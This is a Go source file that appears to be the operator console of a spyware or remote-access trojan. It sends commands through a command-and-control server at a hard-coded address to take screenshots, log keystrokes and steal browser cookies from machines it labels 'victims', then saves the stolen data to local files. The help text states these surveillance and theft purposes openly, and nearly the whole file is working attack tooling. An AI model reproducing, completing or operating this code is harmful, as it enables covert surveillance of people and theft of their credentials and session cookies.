package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"image/png"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
	"time"
)

const (
	BaseUrl = "http://10.152.2.119:8080"
	Url     = BaseUrl + "/appendCommands"
	GET     = iota
	SET
	POST
)

var aliases = map[string]string{}

var commands = map[string]func(command *Command){
	"alias":      ExecuteAliasCommand,
	"screenshot": ExecuteScreenshot,
	"cookies":    ExecuteTextFileCommand,
	"keylog":     ExecuteTextFileCommand,
	"lazyKeylog": ExecuteTextFileCommand,
}

type Log struct {
	Date   time.Time `json:"date"`
	Victim string    `json:"victim"`
}

type TextLog struct {
	Log  Log    `json:"log"`
	Body string `json:"body"`
}

type Command struct {
	Method  int
	Command string
	Body    []string
}

func parseCommand(comm []string) *Command {
	if len(comm) < 2 {
		return nil
	}
	return &Command{Method: commandType(comm[1]), Command: comm[0], Body: comm[2:]}
}

func commandType(com string) int {
	switch com {
	case "get":
		return GET
	case "set":
		return SET
	default:
		return POST
	}
}

func SendTextToServer(txtLog *TextLog) (*http.Response, error) {
	text, err := json.Marshal(txtLog)
	if err != nil {
		return nil, err
	}
	resp, err := http.Post(Url, "application/json", bytes.NewBuffer(text))
	if err != nil {
		return nil, err
	}
	return resp, nil
}

func GetFromServer(txtLog *TextLog) (*http.Response, error) {
	resp, err := http.Get(fmt.Sprintf("%s/%s/%s", BaseUrl, txtLog.Body, getVictim(txtLog.Log.Victim)))
	if err != nil {
		return nil, err
	}
	return resp, nil
}

func ExecuteAliasCommand(command *Command) {
	if command.Method == GET {
		for k, v := range aliases {
			fmt.Printf("%s: %s\n", k, v)
		}
		return
	}
	if len(command.Body) != 2 {
		fmt.Println("Number of body arguments is not 2")
		return
	}
	aliases[command.Body[0]] = command.Body[1]
}

func ExecuteScreenshotGet(body []string) {
	var res []byte
	resp, err := GetFromServer(&TextLog{Body: "screenshot", Log: Log{Date: time.Now(), Victim: getVictim(body[0])}})
	json.NewDecoder(resp.Body).Decode(&res)
	img, _ := png.Decode(bytes.NewReader(res))
	out, err := os.Create(fmt.Sprintf("%s.png", getVictim(body[0])))
	defer out.Close()
	if err != nil {
		fmt.Println("Error decoding")
		return
	}
	png.Encode(out, img)
}

func ExecuteScreenshot(com *Command) {
	if com.Method == GET {
		ExecuteScreenshotGet(com.Body)
	} else {
		ExecutePostRequest(com)
	}
}

func ExecutePostRequest(com *Command) {
	_, err := SendTextToServer(&TextLog{Body: com.Command, Log: Log{Date: time.Now(), Victim: getVictim(com.Body[0])}})
	if err != nil {
		fmt.Println("Error sending command to server")
	}
}

func getVictim(text string) string {
	if aliases[text] == "" {
		return text
	}
	return aliases[text]
}

func ExecuteTextFileCommand(com *Command) {
	if com.Method == GET {
		ExecuteGetFileCommand(com)
	} else {
		ExecutePostRequest(com)
	}
}

func ExecuteGetFileCommand(com *Command) {
	var res string
	resp, err := GetFromServer(&TextLog{Body: com.Command, Log: Log{Date: time.Now(), Victim: getVictim(com.Body[0])}})
	if err != nil {
		fmt.Println("Error reaching the server")
		return
	}
	json.NewDecoder(resp.Body).Decode(&res)
	ioutil.WriteFile(fmt.Sprintf("%s-%s.txt", com.Command, getVictim(com.Body[0])), []byte(res), 0777)
}

func readCommand() {
	reader := bufio.NewReader(os.Stdin)
	for {
		fmt.Print("> ")
		comm, _ := reader.ReadString('\n')
		comm = strings.Trim(comm, "\r\n")
		switch comm {
		case "exit":
			return
		case "help":
			printHelp()
		default:
			comms := strings.Split(comm, " ")
			com := parseCommand(comms)
			if com == nil || commands[com.Command] == nil {
				fmt.Println("It is not a recognized command")
			} else {
				commands[com.Command](com)
			}
		}
	}
}

func printHelp() {
	fmt.Println("HELP SCREEN")
	fmt.Println("screenshot [get|post] [<victim> | <alias>]        Screenshots the victim's computer")
	fmt.Println("alias [get | set <key> <value>]    			   Puts an alias of the key to have the value as value to be used as human-readable form to be used")
	fmt.Println("cookies [get|post] [<victim> | <alias>]           Gets the cookies from the all the victim's browser")
	fmt.Println("help                   				           Prints this message")
	fmt.Println("exit                   				           Exits the program")
}

func main() {
	readCommand()
}
